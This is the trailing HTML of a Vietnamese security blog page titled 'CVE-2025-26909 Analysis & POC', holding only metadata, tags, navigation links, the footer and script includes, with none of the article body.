      <div class="post-info-mod"><span title="Cập nhật ngày 2025-10-27 01:40:34">Cập nhật ngày 2025-10-27&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/9adcfc8a6a2e794d74d7a68cbdb1d508a51dfe07" rel="external nofollow noopener noreferrer" target="_blank" title="Basic update&#10&#10Commit: 9adcfc8a6a2e794d74d7a68cbdb1d508a51dfe07 [9adcfc8]&#10Author: w41bu1&#10Date: 2025-10-27 01:40:34"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>9adcfc8</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-10-18-cve-2025-26909/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-18-CVE-2025-26909/index.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-18-CVE-2025-26909/index.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-26909&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-26909&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-18-CVE-2025-26909/index.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41bu1/Desktop/w41bu1.github.io/content/posts/2025-10-18-CVE-2025-26909/index.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/" data-title="CVE-2025-26909 Analysis &amp; POC" data-hashtags="analyst,plugin,lfi"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/" data-title="CVE-2025-26909 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/lfi/" class="post-tag" title="Nhãn - Lfi">Lfi</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-10-17-cve-2025-39399/" class="post-nav-item" rel="prev" title="CVE-2025-39399 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-39399 Analysis &amp; POC</a><a href="/vi/posts/2025-10-19-cve-2025-6715/" class="post-nav-item" rel="next" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Cung cấp bởi <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.152.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Chủ đề - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/posts/2025-10-18-cve-2025-26909/config/page.js" defer></script><script src="/js/theme.min.js" defer></script></body>
</html>
